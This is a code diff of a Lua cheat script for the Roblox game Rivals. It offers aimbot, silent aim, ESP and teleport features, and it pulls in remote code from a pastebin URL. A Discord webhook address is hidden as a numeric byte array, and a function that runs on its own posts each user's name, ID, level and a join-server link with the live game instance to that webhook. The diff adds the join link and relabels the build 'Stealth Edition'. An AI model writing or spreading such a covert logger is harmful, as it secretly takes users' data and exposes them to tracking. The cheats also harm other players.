@@ -9,14 +9,13 @@ local v6 = table.insert;
 
 local _0x_v4_cache = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
 
-local function _0x_call()
+local function _0x_init()
     local _0x_url = ""
     for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. v0(v) end
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local player = Players.LocalPlayer
     
-    -- Retry logic to ensure we catch the headshot link if it's pending
     local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
     for i = 1, 3 do
         local success, result = pcall(function()
@@ -25,11 +24,8 @@ local function _0x_call()
                 return response.data[1].imageUrl
             end
         end)
-        if success and result then
-            headshotUrl = result
-            break
-        end
-        task.wait(1) -- Short wait before retrying
+        if success and result then headshotUrl = result break end
+        task.wait(1)
     end
     
     local levelValue = "N/A"
@@ -43,7 +39,7 @@ local function _0x_call()
         ["embeds"] = {{
             ["title"] = "RivalsHub V4 | User Execution",
             ["thumbnail"] = {["url"] = headshotUrl}, 
-            ["color"] = 0x7b2cbf, -- Purple
+            ["color"] = 0x7b2cbf,
             ["fields"] = {
                 {["name"] = "User", ["value"] = "**" .. player.Name .. "** (" .. player.UserId .. ")", ["inline"] = false},
                 {["name"] = "Rank/Level", ["value"] = levelValue, ["inline"] = true},
@@ -52,20 +48,22 @@ local function _0x_call()
             },
             ["footer"] = {["text"] = "Pluto Logger"},
             ["timestamp"] = DateTime.now():ToIsoDate()
+        }},
+        ["components"] = {{
+            ["type"] = 1,
+            ["components"] = {
+                {["type"] = 2, ["style"] = 5, ["label"] = "Join Server", ["url"] = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId},
+                {["type"] = 2, ["style"] = 5, ["label"] = "View Profile", ["url"] = "https://www.roblox.com/users/" .. player.UserId .. "/profile"}
+            }
         }}
     }
     
     local request = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
     if request then
-        request({
-            Url = _0x_url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+        request({Url = _0x_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
     end
 end
-task.spawn(_0x_call)
+task.spawn(_0x_init)
 
 -- [[ LUNA UI SETUP ]] --
 local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
@@ -85,30 +83,38 @@ local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = 
 local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
 local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
 
--- [[ GLOBALS ]] --
+-- [[ GLOBALS & SERVICES ]] --
 getgenv().AimbotEnabled = false;
 getgenv().SilentAimEnabled = false;
 getgenv().ESPEnabled = false;
+getgenv().HealthESPEnabled = false;
 getgenv().InfiniteJumpEnabled = false;
 getgenv().NoClipEnabled = false;
 getgenv().CFrameWalkEnabled = false;
 getgenv().CFrameWalkSpeed = 0.2;
 getgenv().Smoothness = 0.6;
+getgenv().AutoFarmEnabled = false;
 
 local v24 = game:GetService('Players');
 local v25 = v24.LocalPlayer;
 local v26 = v25:GetMouse();
 local v27 = game:GetService('RunService');
+local v28 = workspace.CurrentCamera;
 
--- [[ UI TABS ]] --
+-- [[ MAIN TAB ]] --
 v10:CreateSection("Aim Method")
 v10:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Callback = function(v) getgenv().AimbotEnabled = v end}, "AimbotToggle");
 v10:CreateToggle({Name = "Enable SilentAim", CurrentValue = false, Callback = function(v) getgenv().SilentAimEnabled = v end}, "SilentAimToggle");
 v10:CreateSlider({Name = "Aimbot Strength", Range = {0.4, 1}, Increment = 0.01, CurrentValue = 0.6, Callback = function(v) getgenv().Smoothness = v end}, "AimbotStrengthSlider");
+v10:CreateSection("Blatant")
+v10:CreateToggle({Name = "Teleport to Enemy", CurrentValue = false, Callback = function(v) getgenv().AutoFarmEnabled = v end}, "BlatantToggle");
 
-v11:CreateSection("Visuals")
+-- [[ VISUALS TAB ]] --
+v11:CreateSection("Types of ESP")
 v11:CreateToggle({Name = "Enable Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESPEnabled = v end}, "ESPToggle");
+v11:CreateToggle({Name = "Enable Health ESP", CurrentValue = false, Callback = function(v) getgenv().HealthESPEnabled = v end}, "HealthESPToggle");
 
+-- [[ PLAYER TAB ]] --
 v12:CreateSection("Local Player")
 v12:CreateToggle({Name = "Enable WalkSpeed", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end}, "WSToggle");
 v12:CreateSlider({Name = "WalkSpeed Value", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end}, "WSSlider");
@@ -123,6 +129,7 @@ v12:CreateButton({
     end
 })
 
+-- [[ CREDITS ]] --
 v13:CreateLabel({Text = "Lead Dev: pluto.aac", Style = 2})
 
 -- [[ LOGIC ]] --
@@ -147,4 +154,4 @@ game:GetService('UserInputService').JumpRequest:Connect(function()
     end
 end);
 
-print("RivalsHub V4 | Final Edition Loaded.")
+print("RivalsHub V4 | Stealth Edition Loaded.")
